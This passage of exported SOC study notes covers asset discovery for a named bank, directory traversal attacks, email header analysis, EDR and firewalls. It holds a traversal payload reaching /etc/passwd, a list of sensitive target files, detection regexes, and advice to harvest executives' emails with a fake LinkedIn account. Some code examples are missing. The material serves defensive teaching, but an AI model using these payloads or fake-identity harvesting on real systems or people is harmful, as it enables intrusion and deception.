DNS records, check these domains and add them to our inventory after verification.\nWe can check the DNS records with the “dig” command on the command line or we can use the tools that work online on the internet. In this example, we are viewing DNS records using the dnslytics.com tool. In order to discover potential domains, we need to reverse records that are managed by the organization. For example, a shared nameserver belonging to any hosting company hosts too many domains, and these domains mostly do not belong to us. Therefore, it is useful to examine the records of the mail server or nameserver that belongs to the organization. In this example, the ns2.abanca.com record stands out. When the related nameserver is reversed on the same tool, it shows that 98 other domains are hosted on this nameserver.\n\nAll the domains that are listed here are potentially our own, as they are hosted on our own nameserver. After performing the verification, we can add them to our inventory.\nSubdomains\nThere are many tools that are available online or on the command line to find subdomains. We will now use 4 of them. These tools are SecurityTrails, Aquatone, Sublist3r, and Assetfinder.\nSecurityTrails can be used on the command line via the hacktrails tool or API or queries can be made from the visual interface. It produces high-quality output.\nsecuritytrails.com/list/apex_domain/abanca.com\n\nSecondly, the Sublist3r tool runs on the command line and finds and outputs findings from multiple sources. It is run with the command in the screenshot.\n\nThirdly, “Aquatone” collects data and produces output by querying from multiple sources, just like the Sublist3r tool. If you enter the necessary API keys in the configuration files for the resources that require API keys, the number of subdomains it finds will increase. Aquatone can check the activity status of the subdomains it finds with the help of the scan module it contains, and it can check whether there is a takeover vulnerability on the subdomains it finds with the help of the takeover module it has.\n\nFinally, with the “assetfinder” tool, you can query subdomains and obtain data from many sources.\n\nOne of the most important points when searching for a subdomain is to get as much data from as many sources as possible. After collecting and bringing all the data together, we will have a fairly large list of subdomains.\nWebsites\nIn order to find the websites, we need to send requests to the domains and subdomains we find. We obtain our active websites by examining the domains or subdomains that respond to our HTTP/HTTPS requests.\n\nAs you can see in the above screenshot, when we list all of our domains and scan them on the “httpx “ tool, it will list all the domains that respond to our http/https requests. As an alternative to “httpx” tool you can also use “httprobe” tool which is a tool that will meet your needs with similar functions.\nLogin Pages\nDetecting websites with login screens is a bit more challenging than usual. If you wish, you can go through the websites you find manually and separate those with a login screen and list them together. Since this process requires complete manpower, it will be an unnecessary and time-consuming process. Instead, this can be done with some simple scripts. The “python” language is a perfect fit for this process. Thanks to the many libraries it contains, we can do this with very few lines of code with very little effort. We can detect the login pages by sending requests to the websites we have and searching for clues for the login pages in the content of the returned response by using the requests and BeautifulSoup libraries in python. For this process, we first need to check the background code of the login page and look for some indicators that will give us a clue about whether there is a login page or not. We can simply look for answers to the following sample questions and try to figure out whether the page is a login page or not with the indicators and answers we have obtained:\n\n\nIs the word “Login” or its corresponding phrase in any language possible on the page?\n\n\nAre form tags used on the page?\n\n\nAre there expressions such as “Username” or “Password” in the placeholder section of the input fields on the page?\n\n\nAre there “Login” or similar expressions in the title or header of the page?\n\n\nIn short, if the script we wrote parses the content in the response to answer these questions, we can detect most of the login pages in a short time.\nTechnologies Used on Websites\nThe technologies used on the websites we detect will make an important contribution to us, especially in terms of vulnerability intelligence. For example, after we determine the CMS and the version used on a website, we can take quick action on the remediation if there is any matching vulnerability found in the product and the version used on the website in the CVEs we pull from our intelligence sources. There are multiple tools and manual methods to detect the technologies used on the websites. We will use soy.abanca.com/, one of the websites we have identified for testing purposes. First of all, we install the “Wappalyzer” tool (chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg) in our browser in the Chrome Web Store. After opening soy.abanca.com on our browser, we click on the “Wappalyzer” tool icon in the upper right corner, the application gives us as much as it detects in terms of the technologies used on the page.\n\nAs you can see in the screenshot above, the content management system has listed all the information about the database and the libraries used as much as it can detect. “Whatruns”, “BuiltWith” and “Whatcms” applications can be used as an alternative to the Wappalyzer tool.\n\n\nThe above screenshots show that “Whatruns” and “BuiltWith” tools are installed as browser add-ons and work just like “Wappalyzer” tool.\n\nUnlike other tools, “Whatcms” is an online tool and it is available at whatcms.org. All you need to do is to enter the URL address you want to scan, and it will display the detections.\nIf you want to detect it manually rather than using a tool, you can examine the source code of the page and make a technology detection by viewing the file paths of the theme belonging to the content management system and the libraries given in the code, especially in the script tags.\n\nAnother tool-independent method would be to examine the header of the response returned from the page from the developer console. We can display information about the technologies used on the page within the header of the returned responses.\n\nIP Addresses\nIP addresses are one of the most important assets of our organization. There are serious risks involved when open ports on IP addresses are not checked regularly or if the ports are still used after the services running on these ports are outdated. Therefore, the monitoring of these ports and services and detecting the risks involved in a timely manner is vital for a network. We can make a list by analyzing the IP addresses of the domains and subdomains we found. In order to detect these IPs, we can collect the A records of the domains or detect the IP addresses by sending a request and resolving it. In addition, in order to detect all the active IP addresses contained in the IP blocks used within the organization, we can send requests to all the IPs in the block and select the active ones.\nIP Blocks\nSince IP blocks contain mostly the IPs owned by the organization, the IPs with the highest risk are within these blocks. Therefore, follow-up of these is very important. We can detect IP blocks by looking for patterns in the IP addresses we obtained from the domains and checking the whois information of consecutive IP addresses to understand whether they belong to the organization or not.\nAs a secondary method, we can search for the keywords of our organization by using the org parameter on Shodan. The org parameter is a search parameter used for the organization part of the IP addresses. For instance when we search for org:“Abanca” it will list the IP addresses with the word Abanca in the organization section. By examining these IP addresses, we can look at their whois information and find out whether they belong to the organization and which block they belong to.\n\nIn addition to Shodan, alternatives such as Binaryedge and Zoomeye can be used.\nLastly, you can also detect blocks by using online tools that make IP block associations over bgp.he.net and similar domain or IP addresses.\n\nDNS Records\nMonitoring DNS records is important for detecting unknown DNS record changes. You can use Google’s online dig tool or use websites like dnslytics.com to detect DNS records. In addition, DNS records can also be accessed with the dig command on the command line.\nC-Level Employee Mails\nFor senior executives, email compromises may result in disaster. The data that’s transmitted within the mail traffic on a daily basis is crucial for the organization. Therefore, it is very important to monitor corporate email traffic as well as personal emails.\n\n\n\n\nThere are several tools that are frequently used to detect these e-mails. We recommend using a fake Linkedin account and a fake email address when using the tools. These tools work as chrome extensions. You can download the extensions from the Chrome Web Store or download them from their website and import them into chrome. These applications include “SalesQL”, “RocketReach”, “Apollo”, and “ContactOut”. All extensions work in the same logic. Basically, we just go to the person’s Linkedin profile and click on the extension. Extensions will list us the e-mail addresses they can detect.\nNetwork Applications and Operating Systems\nOne of the most important steps for us to be able to track vulnerabilities actively or passively is to find all the applications and operating systems. All the methods mentioned in item 5 are also valid in this section. In addition, in this section, we can collect discovered services by querying our IP addresses via shodan with passive scanning or we can detect them via active scanning. Network applications and operating system detections can be made according to the responses to the requests we sent to the open ports of our previously removed IP addresses in our asset list\n\nBin Numbers and Swift Codes\nBin numbers and swift codes are one of the most important assets to be monitored for matters such as the detection of stolen credit cards on the intelligence side, which are of particular interest to fraud teams in banks. We will use public databases designed for the detection of bin numbers and Swift codes. There is more than one database to find the bin numbers of an organization. Some of those are sites like “bincheck.io”, “freebinchecker.com”, “bintable.com”.\n\nFor example, we can list the bin numbers of Abanca on the bincheck.io site by filtering the country and the bank names, as seen above. Other databases work in a similar way. There are sites such as “wise.com”, “bank.codes”, “theswiftcodes.com” to detect Swift codes. We can also obtain swift codes by making bank-based inquiries on these sites.\n\nSSL Certificates\nSSL certificates are one of the most important factors for secure communication. Therefore, we need to determine carefully if there is an SSL certificate on the domains we have detected and add it to our asset list. It is possible to collect SSL certificates manually on the site, but we prefer to use some tools to make it easier since this is a time-consuming process. The most common tools are “Censys” and “crt.sh”.\n\nFor example, the above screenshot shows that we are able to list all the certificates that contain the abanca.com domain on Censys. We can also search for the abanca.com domain on crt.sh, and it lists all the certificates with abanca.com in it.\n\nWe can collect the SSL certificates quickly and easily using these tools."},"SOC/Directory-Traversal-Attack":{"slug":"SOC/Directory-Traversal-Attack","filePath":"SOC/Directory Traversal Attack.md","title":"Directory Traversal Attack","links":[],"tags":[],"content":"What is Directory Traversal?\nDirectory traversal is an attack type that the attackers leverage often to access files and directories that are stored outside the web server’s root directory. It involves manipulating input to be able to access files on a web server that are actually not intended to be accessible by unauthorized users. This type of attack is also known as the “dot-dot-slash” attack, and it can be used to gain unauthorized access to sensitive data or execute arbitrary code on a web server.\nFor example, let’s say a web application uses the following URL to display user profile pictures:\nexample.com/profiles/picture.php\nAn attacker can leverage directory traversal attack to access files outside of the intended directory by adding ../ to the URL. For instance, they could use the following URL to access a file outside of the profiles directory: example.com/profiles/picture.php\nThis would give the attacker access to sensitive system files, such as the password file.\nActually, at first look, it’s pretty similar to a Local File Inclusion vulnerability. The main difference between the directory traversal and LFI is the source of the input. Directory traversal involves in manipulating the input that is used to access files on a web server, whereas LFI involves in manipulating input that is used to include local files within a web application.\nIn a local file inclusion vulnerability, an attacker can use user input to include a file from the local file system into the web application. This can allow the attacker to execute arbitrary code on the server to access the sensitive data.\nFor example, consider a web application that includes a file based on user input, such as include($_GET[‘page’]). An attacker could manipulate the page parameter to include a sensitive file on the server, such as ../../../../etc/passwd. This would allow the attacker to read the password file and gain unauthorized access to the system.\nIn contrast, directory traversal vulnerabilities allow attackers to access files outside of the web application’s root directory. This can also allow them to execute arbitrary code or access sensitive data, but the attack vector is different.\nDirectory Traversal Possible Vectors\nDirectory traversal attacks can occur through various attack vectors, including:\n\nUser input: Attackers can manipulate user input parameters, such as URLs, file paths, and form fields, to access files outside of the intended directory. This can be done by adding “../” or other special characters to the input.\nCookies: If a web application stores user data in cookies, attackers can try to manipulate the cookie value to access files outside of the intended directory.\nHTTP headers: Attackers can manipulate HTTP headers, such as the Referer or User-Agent header, to access files outside of the intended directory.\nFile upload: If a web application allows file uploads, attackers can upload malicious files that contain directory traversal attacks.\nDirect requests: Attackers can try to access files and directories directly by guessing or brute-forcing the file names or paths.\nURL manipulation: Attackers can try to manipulate the URL of a web application to access files outside of the intended directory. For example, they can add ”/../” to the URL to go up one directory level.\nMalicious links: Attackers can send users malicious links that contain directory traversal attacks. When the user clicks on the link, the attack is executed on their computer.\n\nHow Directory Traversal Works?\nHere’s an example of vulnerable code that is susceptible to directory traversal attacks in a PHP script:\n\nIn this example, the script takes a file name as a parameter from the user input using the $_GET method. The script then concatenates the user input with the document root directory to form a full path to the file.\nHowever, this code is vulnerable to directory traversal attacks since an attacker can manipulate the file parameter to include ../ characters, which will allow them to access files outside of the intended directory. For example, an attacker could use the following URL to access the /etc/passwd file on the server:\n\nImpact of Directory Traversal\nThe impact of a directory traversal attack can be severe, depending on the files and directories that the attacker can access.\nAttackers who successfully exploits a directory traversal vulnerability can view, modify, or delete files that they are not authorized to access. This can lead to a variety of security risks and attacks, including:\n\nDisclosure of sensitive data: An attacker can access sensitive files, such as password files, configuration files, and user data, which can be used for identity theft, fraud, or other malicious activities.\nExecution of arbitrary code: An attacker can upload and execute malicious files that contain commands or code that can harm the system, such as malware or backdoors.\nDenial of service: An attacker can delete critical files or cause a system to crash, resulting in a denial of service attack.\nSystem compromise: An attacker who gains access to system files or directories can use\n\nPrevention Methods for Directory Traversal Attacks\nHere are some best practices to prevent directory traversal attacks in web applications:\n\n\nInput validation and sanitization: Validate and sanitize all user input, especially the file paths and the directory names. This can involve using regular expressions or other methods to check the input for valid characters, and to limit the input to known values or directories.\n\n\nAccess controls: Limit the web server’s access to only the files and directories required for the application to function. Use file the system permissions and access controls to restrict access to sensitive files and directories.\n\n\nRelative file paths: Use relative file paths instead of absolute paths whenever possible. This can prevent attackers from using the “../” character to navigate up to higher-level directories.\n\n\nWhitelisting: Use a whitelist approach where only specific characters are allowed in the file name parameter. This can be done using a validation library or a custom validation function.\n\n\nSecure coding practices: Use secure coding practices, such as avoiding the use of user input directly in file path concatenation, using secure file upload mechanisms, and avoiding the use of insecure functions like eval() and system().\n\n\nWeb application firewall: Use a web application firewall (WAF) to detect and block directory traversal attacks. WAFs can analyze incoming traffic for malicious requests and prevent attacks from reaching the web application.\n\n\nBy following these best practices, web application developers and administrators can reduce the risk of directory traversal attacks and protect their web applications and systems from unauthorized access and data breaches.\nHere’s an example of vulnerable PHP code that is susceptible to directory traversal attacks:\n\nIn this code, the file variable is set to the value of the file parameter from the user’s input. The script then concatenates this value with the document root directory to form a full file path in the $full_path variable. This code is vulnerable to directory traversal attacks because an attacker can include directory traversal sequences like ../ in the file parameter to access files outside of the intended directory.\nHere’s an updated version of the code that uses input validation and sanitization to prevent directory traversal attacks:\n\nIn this updated version of the code, we first validate the input using a regular expression to ensure that the file name only contains alphanumeric characters, underscores, and hyphens. We then use the realpath() function to get the absolute path of the file and check that the resulting path is within the document root directory. This prevents the use of directory traversal sequences like ../ to access files outside of the intended directory. If the file exists, we read and output its contents; otherwise, we output an error message.\nDetecting Directory Traversal Attacks\nIn Part 1, we have overviewed what the directory traversal attack is and how to prevent this attack type. In this part, we’ll have a look at detection techniques and some tips to make it easier. Before the moving on, let’s have a quick look for example payloads for the directory traversal vulnerability;\n\nThese are really basic payloads for directory traversal attacks. So, we should keep in mind ../ (dot dot slash), encoded and double encoded ../ is the key values for this attack type. Here is the basic example for detecting these payloads on nginx access.log file;\n/^.”GET.?.=(%2e%2e%2f).+?.HTTP/.“.$/gm\n\nAs a bypass technique, attackers may also use unicode encode characters to bypass WAF or any other product.\n\nIn that case, Nginx access log will be like;\n\nThese are detection payloads for the Directory Traversal attack. For a successful exploit, attacker needs to access some files. most popular ones are;\nLinux\n\n/etc/issue\n/etc/passwd\n/etc/shadow\n/etc/group\n/etc/hosts\n\nWindows\n\nc:/boot.ini\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\n\n\nBasic regex that we have shared above will work with these logs but to prevent False Positive alarms it can be updated more strictly like;\n/^.”GET.?.=(.+?(?=%2e%2e%2fetc%2f)).+?.HTTP/.“.$/gm"},"SOC/Email-Harvesting":{"slug":"SOC/Email-Harvesting","filePath":"SOC/Email Harvesting.md","title":"Email Harvesting","links":[],"tags":[],"content":"Email harvesting is the process of obtaining email addresses from public, paid, or free services.\nA tool used for email harvesting is: theHarvester."},"SOC/Email-Header-Analysis":{"slug":"SOC/Email-Header-Analysis","filePath":"SOC/Email Header Analysis.md","title":"Email Header Analysis","links":["SOC/Phishing","IP-address","mxtoolbox.com","phishing"],"tags":[],"content":"Here are the key questions we need to answer when checking headings during a Phishing analysis:\n\nWas the email sent from the correct SMTP server?\nAre the data “From” and “Return-Path / Reply-To” the same?\n\nWas the email sent from the correct SMTP server?\nWe can check the “Received” field to see the path the email took. As you can see in the image below, the email came from the server with the IP address “101[.]99.94.116”.\n\nIf we look at who is sending the mail (“sender”), we can see that it is coming from the domain “letsdefend.io”.\n\nSo, under normal circumstances, “letsdefend.io” should be using “101[.]99.94.116” to send mail. To confirm this, we can query the MX servers that “letsdefend.io” is actively using.”\nMXToolBox will help us by showing you the MX servers used by the domain you are asking for.\n\nIf we look at the image above, the domain “letsdefend.io” uses Google addresses as its email server. So there is no relation with the addresses emkei[.]cz or “101[.]99.94.116”.\nThis examination showed that the email did not come from the original address, but was spoofed.\nAre the ‘From’ and ‘Return-Path / Reply-To’ details the same?\nExcept in exceptional cases, we expect the sender of the email and the recipient of the replies to be the same. Here is an example of how these parts are used differently in phishing attacks:\nSomeone sends an email (Gmail, Hotmail, etc.) to LetsDefend with the same last name as someone who works for Google, LetsDefend tells the employee that they have issued the invoice and they need to pay to their XXX account. It inserts the real Google employee’s email address in the “Reply-To” field so that the fake email address will not stand out when the email is replied to.\nGoing back to the email we downloaded above, all we need to do is compare the email addresses in the ‘From’ and ‘Reply-to’ sections.\n\nAs you can see, the data is different. In other words, if we want to reply to this email, we will send a reply to the gmail address below. Please note that just because this data is different doesn’t always mean that it’s definitely a phishing email, we need to look at the event as a whole. In other words, in addition to this suspicious situation, if there’s a malicious attachment, URL, or misleading content in the content of the email, we can understand that it’s a phishing email."},"SOC/Email-Header":{"slug":"SOC/Email-Header","filePath":"SOC/Email Header.md","title":"Email Header","links":[],"tags":[],"content":"What is an Email Header?\nThe header is a section of the email containing information such as sender, recipient, and date. There are also components such as ‘Return-Path’, ‘Reply-To’, and ‘Received’. Below you can see the header details of an example email\n\nWhat does the Email Header do?\n1. Allows you to identify the sender and recipient\nThanks to the “From” and “To” fields in the header, you can find out who is sending an email and who is receiving it. If we look at the email above, which you have downloaded in “eml” format, we can see that it was sent from “ogunal@letsdefend.io” to “info@letsdefend.io”.\n\n2. Spam Blocker\nIt is possible to detect spam emails using header analysis and various other methods. This prevents people from receiving SPAM emails.\n3. Allows You to Track an Email’s Route\nIt is important to check the route an email takes to see if it came from the correct address. If we look at the example email above, we can see that it came from the address “ogunal@letsdefend.io”, but it is still not certain whether it came from the domain “letsdefend.io” or from another fake server that imitates the same name. We can use the header information to answer this question.\nImportant Fields\nFrom\nThe ‘From’ field in an Internet header shows the name and email address of the sender.\nTo\nThis field in the mail header contains the details of the recipient of the email, including their name and email address. Such as CC (carbon copy) and BCC (blind carbon copy) also fall under this category, as they all contain details of your recipients.\nTo find out more about carbon copy and blind carbon copy, see How to use CC and BCC.\nDate\nThis is the timestamp showing when the email was sent.\nIn Gmail, it usually follows the format day dd month yyyy hh:mm:ss\nSo if an email was sent on 16 November 2021 at 4:57:23 pm, it would show up as Wed, 16 Nov 2021 16:57:23.\nSubject\nThe subject is the topic of the email. It summarises the content of the entire message body.\nReturn Path\nThis email header field is also known as Reply-To. When you reply to an email, the reply is sent to the address specified in the Return-Path field.\nDomain Key and DKIM Signatures\nDomain Key and Domain Key Identified Mail (DKIM) are email signatures that help email service providers identify and authenticate your emails, similar to SPF signatures.\nMessage-ID\nThe Message-ID header is a unique combination of letters and numbers that identifies each email. No two emails will have the same Message ID.\nMIME-Version\nMultipurpose Internet Mail Extensions (MIME) is an Internet coding standard. It converts non-text content, such as images, videos, and other attachments, into text so that non-text content can be attached to an email and sent via SMTP (Simple Mail Transfer Protocol).\nReceived\nThe Received section lists each mail server that an email has passed through before arriving in the recipient’s inbox. It’s listed in reverse chronological order - the mail server at the top is the last server the email message passed through, and the mail server at the bottom is where the email originated.\nX-Spam Status\nThe X-Spam Status shows you the spam score of an email message.\nFirst, it’ll highlight if a message is classified as spam.\nIt then shows the spam score of the email and the spam threshold for the email.\nAn email can either meet or exceed an inbox’s spam threshold. If it’s too spammy and exceeds the threshold, it’s automatically classified as spam and sent to the Spam folder.\nHow to Access Email Header?\nGmail\n1. Open the email in question\n2. Click on the 3 dots at the top right ”…“\n3. Click on the “Download message” button.\n\n4. Open the downloaded file with the extension “.eml” with any notebook application\nOutlook\n1. Open the email in question\n2. File → Info → Properties → Internet headers\n\n"},"SOC/Email-Security-Solutions":{"slug":"SOC/Email-Security-Solutions","filePath":"SOC/Email Security Solutions.md","title":"Email Security Solutions","links":[],"tags":[],"content":"What is Email Security Solution?\nEmail Security Solutions is one of the security solutions that provides security against threats that may come via e-mail. It can be software or hardware-based products.\nFunctions of Email Security Solution\n\nEnsuring the security control of the files in the email\nEnsuring security checks of URLs in the email\nDetection and blocking of spoofed emails\nBlocking known harmful emails\nBlocking email addresses with malicious content detected\nTransmitting information about harmful e-mail content to the relevant product or manager as a warning\n\n\nThe Importance of Email Security Solutions for Security\nPhishing, which is the most popular attack method today, is a major threat to corporate and individual users. The consequences of phishing attacks, which aim to collect information about organizations or individuals by using the vulnerability of the human factor, or to harm the target, can sometimes be very severe. Therefore, threats that may come via email should never be taken lightly. It is necessary to verify that the files and links sent in the email are secure, and not malicious. At this point, the importance of email security solutions that offer comprehensive security measures emerges. Like other security products, email security solutions are not enough to provide security alone, but they are an important component in ensuring security. Its main purpose is to prevent malicious emails from reaching the end user by automatically analyzing incoming emails.\nSome popular Email Security Solutions products used within the cyber security industry are as follows:\n\nFireEye EX\nIronPort\nTrendMicro Email Security\nProofpoint\nSymantec\n"},"SOC/Endpoint-Detection--and--Response-(EDR)":{"slug":"SOC/Endpoint-Detection--and--Response-(EDR)","filePath":"SOC/Endpoint Detection & Response (EDR).md","title":"Endpoint Detection & Response (EDR)","links":[],"tags":[],"content":"What is EDR?\nEndpoint Detection and Response (EDR) is a security product that is installed on endpoint-qualified devices, constantly monitors the activities in the system, tries to detect security threats such as ransomware &amp; malware, and takes action against malicious activities.\nEndpoint Devices\nExamples of endpoint devices are:\n\nEDR Core Components\nEDR products can perform many different operations on the endpoint device. These are the processes that support each other to ensure the security of the device. EDR core components are as follows:\n\nEndpoint data collection agents\nAutomated response\nAnalysis and forensics\n\nFunctions of EDR\nThe duties of EDR products are generally as follows:\n\nMonitoring and collecting each process on the device that may identify a security threat\nAnalyzing the behavior of threat actors according to the data collected on the device\nInforming the relevant analyst by taking the appropriate security action against the threat actor obtained from the collected data.\nAllow forensic analysis on the device to conduct in-depth investigation of suspicious activities\n\nThe Importance of EDR for Security\nEnsuring the security of the devices that EDR products need to protect has become an essential element to be considered today. Because attackers aim to gain access to the network by turning to weak devices in terms of security. After gaining access to the network through an endpoint, the attacker tries to access more critical systems. In this way, if there is an endpoint that does not have an EDR product installed and is not sufficiently secure, it can be used by the attacker for initial access.\nSome popular EDR products used within the cybersecurity industry are as follows:\n\nSentinelOne\nCrowdstrike\nCarbonBlack\nPalo Alto\nFireEye HX\n\nWhat log sources does EDR have?\nEDR product keeps some information as a log by monitoring the system on which it is installed. The processes running on the system are monitored and the names of the files accessed by the programs and their access information are recorded by EDR as logs. It records which programs are run, which files the run programs read, or which file they make changes to. Each EDR can obtain various information through the system. In general, it can be said that the EDR product monitors and logs the sections deemed necessary in terms of security.\nFor example, in the image below, it is seen that the endpoint security product lists the processes on the device:\n\nEndpoint security product provides some information about the processes it lists to the user. Some of this information is size information, hash information, and path information, as seen in the image above."},"SOC/Fast-Flux":{"slug":"SOC/Fast-Flux","filePath":"SOC/Fast Flux.md","title":"Fast Flux","links":["Networking/DNS","SOC/Phishing","SOC/C2"],"tags":[],"content":"Fast Flux is a DNS technique used by botnets to hide Phishing, web proxying, malware delivery, and malware communication activities behind compromised hosts acting as proxies.\nThe purpose of using the Fast Flux network is to make the communication between malware and its command and control server (C2) challenging to be discovered by security professionals."},"SOC/Firewall":{"slug":"SOC/Firewall","filePath":"SOC/Firewall.md","title":"Firewall","links":["OSI-model","Networking/TCP","Networking/NAT"],"tags":[],"content":"What is Firewall?\nA firewall is a security software or hardware that monitors incoming and outgoing network traffic according to the rules it contains and allows the passage of network packets or prevents the passage of packets according to the nature of the rule.\nTypes of Firewall\nA firewall is divided into many different types according to its features:\nApplication-Level Gateways (Proxy Firewalls)\nApplication-Level Gateways (Proxy Firewalls) are a type of firewall that functions at the application layer between two end systems. Unlike basic firewalls, it captures and analyzes packets in the application layer according to the OSI model. In this way, it works as an additional security measure on the application layer.\nCircuit-Level Gateways\nCircuit-Level Gateways are a type of firewall that can be easily configured, has low resource consumption, and has a simplified structure. These types of firewalls verify TCP connections and sessions and operate in the session layer of the OSI model.\nCloud Firewalls\nCloud Firewalls are the type of firewall used when the institution receives firewall service over the cloud as a service. Another name is “FWaaS” (firewall-as-a-service). There are some advantages to using a cloud firewall. For example, cloud firewalls have no physical resources, so they can be easily reconfigured based on demand or traffic load. Additional capacity can be added to accommodate increased traffic.\nEndpoint Firewalls\nEndpoint Firewalls are a type of host-based firewall installed on devices. It is a type of firewall that is often difficult to manage. It is an important component that must be used to ensure security. For example, the “Windows Defender Firewall”, which comes pre-installed in Windows, is an example of this type of firewall.\nNetwork Address Translation (NAT) Firewalls\nNetwork Address Translation (NAT) Firewalls are a type of firewall designed to access internet traffic and block unwanted connections. Such firewalls are used to hide the IP addresses in the internal network from the external network. In other words, it is the firewall where NAT is applied.\nNext-Generation Firewalls (NGFW)\nNext-Generation Firewalls (NGFW) are a type of firewall that combines the features of different firewalls available under the conditions of that day on a single firewall. These firewalls have a deep-packet inspection (DPI) feature. This type of firewall is designed to block external threats, malware attacks, and advanced attack methods.\nPacket-Filtering Firewalls\nPacket-Filtering Firewalls are the most basic type of firewall. It has a feature that monitors network traffic and filters incoming packets according to configured rules. A packet-Filtering firewall blocks the destination port if the incoming packet does not match the rule set. This firewall is one of the quick solutions that can be used without many resource requirements. But there are also some disadvantages. For example, it lacks the ability to block web-based attacks.\nStateful Multi-Layer Inspection (SMLI) Firewalls\nStateful Multi-Layer Inspection (SMLI) Firewall is a type of firewall capable of both packet inspection and TCP handshake verification. With these features, it stands out from other firewalls. It also has the feature of tracking the status of established connections.\nThreat-Focused NGFW\nThreat-Focused NGFW has all the features of an NGFW-type firewall. In addition, it has advanced threat detection features. Thanks to this feature, it can react quickly to attacks. It helps to provide security more effectively thanks to the rules written with a threat focus. Since it monitors every malicious activity from beginning to end, it runs the process faster by shortening the time from the first time it detects the threat to the cleaning phase.\nUnified Threat Management (UTM) Firewalls\nUnified Threat Management (UTM) Firewalls are a special type of stateful inspection firewalls with antivirus and intrusion prevention.\nHow Firewall Works\nAlthough there are many types of firewall devices, they basically work with the same logic. Some rules are needed for a firewall to work. The firewall rule is the part that is checked to decide whether to allow or block the passage of network packets coming to the firewall. For example, firewall rules can be created to prevent two departments from accessing each other’s network within an organization. In this way, a kind of network segmentation is provided and security is increased by interrupting the communication of devices that do not need to communicate with each other. The working principle of a Firewall is basically as follows:\n\nHow the firewall manages network packets by rules is shown below:\n\nAs can be seen above, the passage of incoming packets is allowed or the passage of packets is blocked according to the details in the rules.\nImportance of Firewall for Security\nA firewall is one of the most basic security solutions that should be included in a network. It would not be right to talk about the complete security of a corporate network without a firewall. In addition to being in the existing network, it is also very important that the firewall is correctly configured and managed. It is not possible to protect the network or related host from attacks using only a firewall.\nSome popular Firewall products used in the cybersecurity industry are as follows:\n\nFortinet\nPalo Alto Networks\nSonicWall\nCheckpoint\nJuniper\npfsense\nSophos\n\nWhat log resources does Firewall have?\nFirewall products have logs about network flow because they do network-based filtering. For example, below is some information from firewall logs:\n\nDate/Time information\nSource IP Address\nDestination IP Address\nSource Port\nDestination Port\nAction Information\nNumber of Packets Sent\nNumber of Packets Received\n\nPhysical Location of Firewall Device\nFirewall devices can be located in different places in the network according to their types. For example, the host-based firewall is used to filter inbound/outbound traffic in front of that host. If we consider a corporate network in general terms, a firewall should be located at the interfaces of the institution that go to the internet or at the external interface. The device that will meet the packets coming from the internet even before they come to the IDS / IPS devices is the firewall device.\n"},"SOC/Gaining-Initial-Foothold":{"slug":"SOC/Gaining-Initial-Foothold","filePath":"SOC/Gaining Initial Foothold.md","title":"Gaining Initial Foothold","links":["SOC/Reconnaissance","reverse-shell"],"tags":[],"content":"\n1. Reconnaissance\nReconnaissance is the first step and it provides adversary with all the info needed for getting into a system. It is described in more detail in Reconnaissance page.\n2. Weaponization \n(MITRE Tactic TA0001)\nThis phase of the UKC describes the adversary setting up the necessary infrastructure to perform the attack. For example, this could be setting up a command and control server, or a system capable of catching reverse shells and delivering payloads to the system.\n3. Social Engineering\n(MITRE Tactic TA0001)\nThis phase of the UKC describes techniques that an adversary can employ to manipulate employees to perform actions that will aid in the adversaries attack. For example, a social engineering attack could include:\n\nGetting a user to open a malicious attachment.\nImpersonating a web page and having the user enter their credentials.\nCalling or visiting the target and impersonating a user (for example, requesting a password reset) or being able to gain access to areas of a site that the attacker would not previously be capable of (for example, impersonating a utility engineer).\n\n4. Exploitation \n(MITRE Tactic TA0002)\nThis phase of the UKC describes how an attacker takes advantage of weaknesses or vulnerabilities present in a system. The UKC defines “Exploitation” as abuse of vulnerabilities to perform code execution. For example:\n\nUploading and executing a reverse shell to a web application.\nInterfering with an automated script on the system to execute code.\nAbusing a web application vulnerability to execute code on the system it is running on.\n\n5. Persistence\n(MITRE Tactic TA0003)\nThis phase of the UKC is rather short and simple. Specifically, this phase of the UKC describes the techniques an adversary uses to maintain access to a system they have gained an initial foothold on. For example:\n\nCreating a service on the target system that will allow the attacker to regain access.\nAdding the target system to a Command &amp; Control server where commands can be executed remotely at any time.\nLeaving other forms of backdoors that execute when a certain action occurs on the system (i.e. a reverse shell will execute when a system administrator logs in).\n\n6. Defense Evasion\n(MITRE Tactic TA0005)\nThe “Defense Evasion” section of the UKC is one of the more valuable phases of the UKC. This phase specifically is used to understand the techniques an adversary uses to evade defensive measures put in place in the system or network. For example, this could be:\n\nWeb application firewalls.\nNetwork firewalls.\nAnti-virus systems on the target machine.\nIntrusion detection systems.\n\nThis phase is valuable when analyzing an attack as it helps form a response and better yet - gives the defensive team information on how they can improve their defence systems in the future.\n7. Command &amp; Control\n(MITRE Tactic TA0011)\nThe “Command &amp; Control” phase of the UKC combines the efforts an adversary made during the “Weaponization” stage of the UKC to establish communications between the adversary and target system.\nAn adversary can establish command and control of a target system to achieve its action on objectives. For example, the adversary can:\n\nExecute commands.\nSteal data, credentials and other information.\nUse the controlled server to pivot to other systems on the network.\n\n8. Pivoting\n(MITRE Tactic TA0008)\n“Pivoting” is the technique an adversary uses to reach other systems within a network that are not otherwise accessible (for example, they are not exposed to the internet). There are often many systems in a network that are not directly reachable and often contain valuable data or have weaker security.\nFor example, an adversary can gain access to a web server that is publicly accessible to attack other systems that are within the same network (but are not accessible via the internet)."},"SOC/Gathering-Threat-Intelligence":{"slug":"SOC/Gathering-Threat-Intelligence","filePath":"SOC/Gathering Threat Intelligence.md","title":"Gathering Threat Intelligence","links":[],"tags":[],"content":"One of the most important things when collecting threat intelligence is to keep the range of sources from which data is collected as wide as possible. For example, when collecting malicious hashes, it is useful to collect them from as many sources as possible. In addition, in order not to increase the false positive rate while expanding the sources, we can set a false positive limit value and apply false positive filters to the collected sources. This way we can remove the sources that bring high false positive values from our intelligence sources. We will briefly talk about the most popular sources where we can collect threat intelligence data and their possible equivalents:\nShodan\nShodan is a web-based server search engine. It is one of the most popular search engines of its kind, where users can search for systems open to the internet with certain filters. Searches related to an organization or a country may be conducted through Shodan worldwide. Shodan has a flexible structure that can be shaped in any direction we want to use it. For example, we can detect all the systems of a specific country or an organization with port# 21 that are open to the internet via shodan. Usage examples will be explained in detail in the following sections.\n\nMany data can be accessed instantly by searching the interface on Shodan. Also, we may need to pull the data through the API as collecting intelligence manually is not possible.\n\nYou can access the api documentation at 